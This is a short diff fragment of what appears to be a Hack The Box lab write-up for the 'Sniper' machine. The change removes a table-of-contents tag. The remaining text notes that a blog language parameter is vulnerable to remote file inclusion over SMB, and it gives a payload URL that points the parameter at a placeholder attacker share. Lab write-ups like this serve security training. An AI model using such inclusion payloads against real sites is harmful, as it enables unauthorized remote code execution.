@@ -10,8 +10,6 @@ tags:
 
 # Sniper
 
-[[toc]]
-
 ## Initial Foothold
 
 http://sniper.htb/blog/?lang=\\xx.xx.xx.xx\share\test.php is vulnerable to RFI over SMB.
